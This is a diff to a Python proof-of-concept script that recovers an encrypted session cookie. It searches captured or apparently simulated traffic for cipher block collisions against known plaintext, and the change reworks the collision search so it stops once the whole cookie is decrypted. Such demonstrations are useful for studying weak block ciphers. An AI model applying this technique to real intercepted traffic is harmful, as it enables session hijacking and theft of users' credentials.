@@ -39,14 +39,12 @@ def find_encrypted_cookies(encrypted_round_trips):
             prev = round_trip['request']['cipher'][location - 1]
             encrypted[block] = {
                 "prev": prev,
-                "index": location,
-                "plain": None
+                "index": location - COOKIE_LOCATION[0],
             }
 
     return encrypted
 
 def find_plaintext_from_collision(plain, prev_cipher, prev_cookie):
-    print(plain, prev_cipher, prev_cookie)
     plain = plain.encode()
     final = []
 
@@ -56,45 +54,53 @@ def find_plaintext_from_collision(plain, prev_cipher, prev_cookie):
     return ''.join(final)
 
 
-def check_for_collision(round_trip, plaintext, i, cookie_blocks):
+def check_for_collision(round_trip, plaintext, i, cookie_blocks, plain_cookie):
     cipher = round_trip['cipher']
     if cipher[i] in cookie_blocks:
-        if cookie_blocks[cipher[i]]["plain"] is not None:
+        cookie_block = cookie_blocks[cipher[i]]
+        if plain_cookie[cookie_block["index"]] is not None:
             return
-        print("Found a collision!", cipher[i])
+        print("Found a collision!", cipher[i], i)
         plain = KNOWN_PLAIN_TEXTS["request"][i]
         if i == 0:
             prev = round_trip['iv']
         else:
             prev = cipher[i-1]
-        cookie_prev = cookie_blocks[cipher[i]]["prev"]
+        cookie_prev = cookie_block["prev"]
         cookie_plain = find_plaintext_from_collision(plain, prev, cookie_prev)
-        cookie_blocks[cipher[i]]["plain"] = cookie_plain
+        plain_cookie[cookie_block["index"]] = cookie_plain
 
 
-def find_collision_with(encrypted_round_trips, cookie_blocks):
+def decrypt_cookie(encrypted_round_trips, cookie_blocks):
+    plain_cookie = [None]*(len(COOKIE_LOCATION) - 1)
     for round_trip in encrypted_round_trips:
         request = round_trip['request']
-        for i in range(len(request)):
+        for i in range(len(request['cipher'])):
             if i in COOKIE_LOCATION:
                 continue
-            check_for_collision(request, KNOWN_PLAIN_TEXTS["request"], i, cookie_blocks)
+            check_for_collision(request, KNOWN_PLAIN_TEXTS["request"], i, cookie_blocks, plain_cookie)
 
         response = round_trip['response']
-        for i in range(len(response)):
+        for i in range(len(response['cipher'])):
             if i in DATE_LOCATION:
                 continue
-            check_for_collision(request, KNOWN_PLAIN_TEXTS["response"], i, cookie_blocks)
+            check_for_collision(request, KNOWN_PLAIN_TEXTS["response"], i, cookie_blocks, plain_cookie)
+
+        if all([(x is not None) for x in plain_cookie]):
+            print("Found the entire cookie!", "".join(plain_cookie))
+            break
+
+    return plain_cookie
+
 
 def main(filename):
     with open(filename, 'rb') as f:
         round_trips = pickle.load(f)
 
     cookie_blocks = find_encrypted_cookies(round_trips)
-    find_collision_with(round_trips, cookie_blocks)
+    decrypt_cookie(round_trips, cookie_blocks)
 
 if __name__ == "__main__":
-    # We will create (2^16)*4 blocks
     parser = argparse.ArgumentParser(description='Analyze encrypted files to find cookie!')
     parser.add_argument('file', type=str,
                         help="File to read packets from. Use generate_packets.py to create the file")
